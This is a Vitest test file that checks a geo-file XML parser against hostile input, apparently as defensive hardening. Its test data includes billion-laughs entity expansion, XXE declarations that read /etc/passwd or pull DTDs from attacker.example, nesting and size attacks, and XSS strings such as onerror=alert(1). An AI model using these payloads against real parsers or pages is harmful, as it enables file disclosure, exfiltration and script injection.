import { describe, expect, it } from "vitest";
import { GEO_FILE_LIMITS } from "~/lib/geo/files";
import { parseXmlDocument, plainText } from "~/lib/geo/files/xml";
import { utf8 } from "../../../../fixtures/geo/files/builders";
import { cpuBudget } from "../../../machinePace";
import { fixture, kml, POINT, refusal, timed } from "./support";

describe("safety: an XML document", () => {
  it.each([
    ['<!DOCTYPE kml [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>'],
    ['<!DOCTYPE kml SYSTEM "file:///etc/passwd">'],
    ['<!DOCTYPE kml [<!ENTITY x SYSTEM "https://attacker.example/x.dtd">]>'],
    ['<!DOCTYPE kml [<!ENTITY % p SYSTEM "https://attacker.example/p.dtd"> %p;]>'],
    ['<!ENTITY a "b">'],
    ["<!ELEMENT kml ANY>"],
  ])("refuses a document with the declaration %s", (declaration) => {
    for (const text of [
      `<?xml version="1.0"?>${declaration}${kml(POINT)}`,
      kml(`${declaration}${POINT}`),
      `<?xml version="1.0"?>${declaration}<gpx><wpt lat="1" lon="2"/></gpx>`,
    ]) {
      const error = refusal(utf8(text));
      expect(error.code).toBe("refused");
      expect(error.message).toBe(
        "The file has a DOCTYPE or another declaration. A file that can declare entities is not read.",
      );
    }
  });

  it("refuses the fixture with entities that expand into each other, at once", () => {
    const [outcome, took] = timed(fixture("hostile-doctype.kml"));
    expect(outcome.error?.code).toBe("refused");
    expect(took).toBeLessThan(cpuBudget(500));
  });

  it("knows the five predefined entities and character references, and no other", () => {
    const root = parseXmlDocument(
      '<a t="&lt;&quot;&#65;&unknown;">&amp;&lt;&gt;&quot;&apos;&#233;&#x41;&nbsp;&xxe;&#0;&#xD800;&#99999999;</a>',
    );
    expect(root.text).toBe("&<>\"'éA&nbsp;&xxe;&#99999999;");
    expect(root.attributes.t).toBe('<"A&unknown;');
  });

  it("refuses a document nested too deep, by the fixture and at the limit", () => {
    expect(refusal(fixture("hostile-deep.kml"))).toEqual({
      code: "too-large",
      message: "The document is nested more than 64 levels deep.",
    });
    const nested = (depth: number) => `${"<a>".repeat(depth)}${"</a>".repeat(depth)}`;
    expect(() => parseXmlDocument(nested(GEO_FILE_LIMITS.xmlDepth))).not.toThrow();
    expect(() => parseXmlDocument(nested(GEO_FILE_LIMITS.xmlDepth + 1))).toThrow(
      /nested more than 64/,
    );
  });

  it("refuses more elements than the limit", () => {
    const [outcome, took] = timed(
      utf8(`<kml>${"<a/>".repeat(GEO_FILE_LIMITS.xmlNodes)}</kml>`),
    );
    expect(outcome).toEqual({
      ok: false,
      error: {
        code: "too-large",
        message:
          "The document has more than 400,000 elements. Simplify it or split it.",
      },
    });
    expect(took).toBeLessThan(cpuBudget(3000));
  });

  it("keeps a bounded number of attributes, each of a bounded length", () => {
    const many = Array.from({ length: 100 }, (_, at) => `a${at}="${at}"`).join(" ");
    const root = parseXmlDocument(
      `<a ${many}/>`.replace(
        "<a ",
        `<a long="${"x".repeat(5000)}" ns:id='7' __proto__="p" long="again" `,
      ),
    );
    expect(Object.keys(root.attributes)).toHaveLength(GEO_FILE_LIMITS.xmlAttributes);
    expect(root.attributes.long).toHaveLength(GEO_FILE_LIMITS.xmlAttributeChars);
    expect(root.attributes.id).toBe("7");
    expect(Object.hasOwn(root.attributes, "__proto__")).toBe(false);
    expect(() => parseXmlDocument(`<a b="${"x".repeat(60_000)}"/>`)).toThrow(
      /a tag that is too long/,
    );
  });

  it("refuses an element with more text than the longest line has", () => {
    const text = "1,2 ".repeat(GEO_FILE_LIMITS.xmlTextChars / 4 + 1);
    const error = refusal(
      utf8(
        kml(
          `<Placemark><LineString><coordinates>${text}</coordinates></LineString></Placemark>`,
        ),
      ),
    );
    expect(error).toEqual({
      code: "too-large",
      message: "One element of the document has more than 8 MB of text.",
    });
    expect(
      refusal(new Uint8Array(GEO_FILE_LIMITS.xmlBytes + 1).fill(60)).message,
    ).toMatch(/over 16 MB/);
  });

  it.each([
    ["a tag that does not end", "<kml><Placemark", /a tag does not end/],
    ["a comment that does not end", "<kml><!-- x", /a comment does not end/],
    [
      "a CDATA section that does not end",
      "<kml><![CDATA[ x",
      /a CDATA section does not end/,
    ],
    [
      "an instruction that does not end",
      "<?xml version",
      /a processing instruction does not end/,
    ],
    ["an element that is not closed", "<kml><Document>", /it ends inside "Document"/],
    [
      "an element closed by another name",
      "<kml><a></b></kml>",
      /"b" is closed where it is not open/,
    ],
    [
      "a closing tag before any element",
      "</kml>",
      /"kml" is closed where it is not open/,
    ],
    ["a tag without a name", "<kml>< /></kml>", /a tag has no name/],
    ["no element", "<!-- only a comment -->", /it has no element/],
  ])("says a file with %s is broken", (_what, text, message) => {
    const error = refusal(utf8(text));
    expect(error.code).toBe("malformed");
    expect(error.message).toMatch(message);
  });

  it("reads hostile markup once: quotes, brackets and long names do not make it go back", () => {
    for (const text of [
      `<a b="${">".repeat(30_000)}">${"<".repeat(100_000)}`,
      `<kml>${"<a b=".repeat(300_000)}`,
      `<kml ${"x ".repeat(15_000)}>${"&".repeat(1_000_000)}</kml>`,
      `<kml>${"<![CDATA[".repeat(200_000)}`,
      `<kml><Placemark><description>${"&lt;".repeat(500_000)}</description><Point><coordinates>1,2</coordinates></Point></Placemark></kml>`,
      `<kml><Placemark><description><![CDATA[${"<script".repeat(300_000)}]]></description><Point><coordinates>1,2</coordinates></Point></Placemark></kml>`,
      `<kml><Placemark><LineString><coordinates>${",".repeat(2_000_000)}</coordinates></LineString></Placemark></kml>`,
    ]) {
      const [outcome, took] = timed(utf8(text));
      expect(took).toBeLessThan(cpuBudget(1500));
      if (outcome.error) expect(outcome.error.code).not.toBe("internal");
    }
  });

  it("makes plain text of html without keeping a tag, a script or a style", () => {
    expect(
      plainText(
        '<p onclick="x()">One</p><style>p { color: red }</style><SCRIPT>alert(1)</SCRIPT>two <b>three</b>',
      ),
    ).toBe("One two three");
    expect(plainText("a < b and b > c")).toBe("a < b and b > c");
    expect(
      plainText("<img src=x onerror=alert(1)>&lt;script&gt;alert(2)&lt;/script&gt;"),
    ).toBe("<script>alert(2)</script>");
    expect(plainText("text <unclosed")).toBe("text");
    expect(plainText("<script>never closed")).toBe("");
  });
});
